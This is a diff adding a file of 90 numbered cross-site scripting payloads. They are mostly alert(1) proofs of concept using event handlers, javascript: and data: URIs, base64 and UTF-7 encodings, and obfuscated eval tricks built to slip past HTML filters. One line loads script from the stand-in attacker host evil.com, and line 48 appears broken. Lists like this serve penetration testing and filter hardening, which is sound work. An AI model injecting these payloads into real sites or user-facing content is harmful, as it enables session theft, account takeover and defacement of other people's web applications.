@@ -1,0 +1,90 @@
+1. <script>alert(1)</script>
+2. <img src=x onerror=alert(1)>
+3. <svg/onload=alert(1)>
+4. <iframe src="javascript:alert(1)"></iframe>
+5. <body onload=alert(1)>
+6. <input onfocus=alert(1) autofocus>
+7. <video><source onerror="alert(1)"></video>
+8. <a href="javascript:alert(1)">click</a>
+9. <math><mi//xlink:href="javascript:alert(1)"></math>
+10. <object data="javascript:alert(1)">
+11. <svg><script>alert(1)</script></svg>
+12. <script/xss>alert(1)</script>
+13. <script><!--alert(1)//--></script>
+14. <script>eval('al'+'ert(1)')</script>
+15. <img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(1)">
+16. <svg><desc><![CDATA[<script>alert(1)</script>]]></desc></svg>
+17. <iframe srcdoc="<script>alert(1)</script>"></iframe>
+18. <marquee onstart=alert(1)>
+19. <div style="animation-name:x" onanimationstart=alert(1)>
+20. <style>@keyframes x{}</style><div style=animation-name:x onanimationstart=alert(1)>
+21. <<script>script>alert(1)</script>
+22. <script src=data:text/javascript,alert(1)>
+23. <script src=//evil.com/xss.js>
+24. <embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+25. <svg><a xlink:href="javascript:alert(1)">X</a></svg>
+26. <form><button formaction="javascript:alert(1)">X</button></form>
+27. <img src="x" srcset="x 1x, x 2x" onerror=alert(1)>
+28. <iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+29. <math><annotation encoding="application/xml-external-parsed-entity" src="javascript:alert(1)"></annotation></math>
+30. <img src=`~` onerror=this.onerror=confirm(1)>
+31. <svg onload=location=`javascript:alert(1)`>
+32. <object data=javascript:alert(1)>
+33. <svg/onload="this.outerHTML='&lt;img src=x onerror=alert(1)&gt;'">
+34. <script charset="utf-7">+ADw-script+AD4-alert(1)+ADw-/script+AD4-</script>
+35. <link rel=stylesheet href="javascript:alert(1)">
+36. <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+37. <b onclick=alert(1)>click</b>
+38. <div onpointerover="alert(1)">hover</div>
+39. <textarea autofocus onfocus=alert(1)>X</textarea>
+40. <img src=x id="x"><script>x.onerror=alert(1);x.src='x'</script>
+41. <svg><script xlink:href="data:text/javascript,alert(1)"></script></svg>
+42. <iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>
+43. <a href="data:text/html,<script>alert(1)</script>">click</a>
+44. <object type="image/svg+xml" data="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">X</object>
+45. <svg><use href="data:image/svg+xml;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></use></svg>
+46. <svg><style><![CDATA[*{animation-name:x}]]></style><div style=animation-name:x onanimationstart=alert(1)>
+47. <img src=x onerror="eval('ale'+'rt(1)')">
+48. <script>top </script>
+49. <img src=x onerror=Function("alert(1)")()>
+50. <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+51. <meta charset="x-imap4-modified-utf7" content="+ADw-script+AD4-alert(1)+ADw-/script+AD4-">
+52. <math><mtext><img src=x onerror=alert(1)></mtext></math>
+53. <script>\u003cscript\u003ealert(1)\u003c/script\u003e</script>
+54. <script>setTimeout('al\u0065rt(1)',10)</script>
+55. <svg><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>
+56. <svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>
+57. <img src=# onerror="confirm``">
+58. <svg><script><![CDATA[alert(1)]]></script></svg>
+59. <iframe onload="javascript:alert(1)">
+60. <script src="data:text/javascript;base64,YWxlcnQoMSk="></script>
+61. <object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>
+62. <script>location='javascript:alert(1)'</script>
+63. <a href="#" onclick="alert(1)">Click</a>
+64. <img src onerror=alert(1)>
+65. <button onclick=alert(1)>Click</button>
+66. <svg id="x" onload="x=location;x='javascript:alert(1)'">
+67. <img src="x" onerror="prompt(1)">
+68. <form action="javascript:alert(1)">
+69. <div onmouseenter="alert(1)">Hover</div>
+70. <script>new Function`alert(1)`</script>
+71. <svg onload="alert&#40;1&#41;">
+72. <math><mtext></mtext><mo onmouseover=alert(1)>X</mo></math>
+73. <svg><style>@keyframes x{}</style><circle style="animation-name:x" onanimationstart=alert(1)>
+74. <img src=x onerror=top.alert(1)>
+75. <a onmouseover="eval('alert(1)')">X</a>
+76. <object data="data:text/html,<script>alert(1)</script>">
+77. <iframe srcdoc="<body onload=alert(1)>">
+78. <img src="x" onerror="setTimeout(function(){alert(1)},10)">
+79. <svg><a href="javascript:alert(1)">click</a></svg>
+80. <img src="x" onerror="this.onerror=null;alert(1)">
+81. <input type="text" value="X" onfocus="alert(1)" autofocus>
+82. <style>*{x:expression(alert(1))}</style>
+83. <svg/onload=alert`1`>
+84. <script>/*<![CDATA[*/alert(1)//]]></script>
+85. <div style="width:expression(alert(1))">
+86. <svg/onload=alert('\x31')>
+87. <img src="x" onerror="alert`1`">
+88. <svg><desc><![CDATA[</script><script>alert(1)</script>]]></desc></svg>
+89. <svg><style>*{x:expression(alert(1))}</style></svg>
+90. <script id=1>alert(1)</script>
